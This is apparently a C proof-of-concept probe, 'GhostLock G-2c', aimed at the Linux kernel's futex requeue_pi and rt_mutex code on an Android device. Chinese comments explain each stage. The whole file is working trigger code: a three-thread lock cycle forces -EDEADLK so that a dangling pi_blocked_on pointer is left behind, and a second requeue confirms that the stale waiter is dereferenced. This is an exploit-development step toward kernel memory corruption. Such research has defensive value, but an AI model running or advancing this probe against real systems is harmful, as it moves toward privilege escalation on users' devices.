/*
 * g2c_deref.c — GhostLock G-2c：用"第二次 requeue_pi"判定悬垂 pi_blocked_on
 *
 * 为什么前两版探针无效：
 *   rt_mutex_adjust_prio_chain() 在 waiter->prio == task->prio 且
 *   detect_deadlock == false 时提前 goto out_unlock_pi（rtmutex.c:596-604）。
 *   而 FUTEX_LOCK_PI 走的是 RT_MUTEX_MIN_CHAINWALK → detect_deadlock = false
 *   → 结构上到不了死锁判定点。只有 rt_mutex_start_proxy_lock()（requeue_pi）
 *   使用 RT_MUTEX_FULL_CHAINWALK，才会真正做死锁检测。
 *
 * 本探针：
 *   [阶段1] 用 G-1 的三锁环触发 -EDEADLK，使 W->pi_blocked_on 悬垂指向
 *           "lock 字段为 C" 的旧 waiter（W 仍阻塞在普通 futex A 上）。
 *   [阶段2] 新线程 W2 在普通 futex A2 上 WAIT_REQUEUE_PI(A2 → **C**)，
 *           主线程对 A2→C 做 CMP_REQUEUE_PI。
 *           start_proxy_lock(C, waiter2, W2)：
 *             try_to_take 失败（C 的 owner 是 O）
 *             task_blocks_on_rt_mutex(FULL_CHAINWALK) → 链走查从 C 出发：
 *               C(owner=O) → O 阻塞于 B → B(owner=W) → W->pi_blocked_on(悬垂)
 *               → lock = C → **C == orig_lock** → -EDEADLK
 *
 * 判据：
 *   -EDEADLK(35)  → 悬垂指针被真实解引用（关键结论）
 *   1 / 0         → W->pi_blocked_on 为空，链走查正常结束（悬垂不存在）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g2c.log"

#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A;  /* 阶段1：W 的等待点 */
	uint32_t A2; /* 阶段2：W2 的等待点 */
	uint32_t B;  /* W 持有 */
	uint32_t C;  /* O 持有 */
	volatile int b_held, c_held, o_blocked, w_waiting;
	volatile int w2_waiting;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld", r);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: WAIT_REQUEUE_PI(A→C)（rt_waiter 在 W 栈上）");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld", r);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: LOCK_PI(B)（预期阻塞，形成环）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_w2(void *arg)
{
	long r;
	(void)arg;
	/* 在 A2 上等待被 requeue 到 C —— 复用同一把 C */
	S->w2_waiting = 1;
	__sync_synchronize();
	lg("W2: WAIT_REQUEUE_PI(A2→C)");
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W2: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2c start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->A2 = S->B = S->C = 0;

	/* ---------- 阶段 1：触发 -EDEADLK ---------- */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("[1] CMP_REQUEUE_PI(A→C, 1)");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[1] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();
	if (!(r == -1 && e == EDEADLK)) {
		lg("阶段1 未命中，终止");
		sync_log();
		_exit(2);
	}
	lg("[1] 达成：W 仍阻塞于 A，W->pi_blocked_on 应悬垂（lock 字段 = C）");
	sync_log();

	/* ---------- 阶段 2：第二次 requeue_pi，目标同为 C ---------- */
	pthread_create(&tw2, NULL, thread_w2, NULL);
	{
		int spin = 0;
		while (!S->w2_waiting && spin < 1000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(150000);

	lg("[2] CMP_REQUEUE_PI(A2→C, 1) —— 若悬垂指针有效，则 C == orig_lock 命中死锁");
	sync_log();
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[2] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 被真实解引用（链走查经 W 回到 orig_lock=C）");
	else if (r >= 0)
		lg("verdict: 链走查正常结束（返回 %ld）→ W->pi_blocked_on 应为空", r);
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	sync_log();
	lg("结束");
	sync_log();
	_exit(0);
}
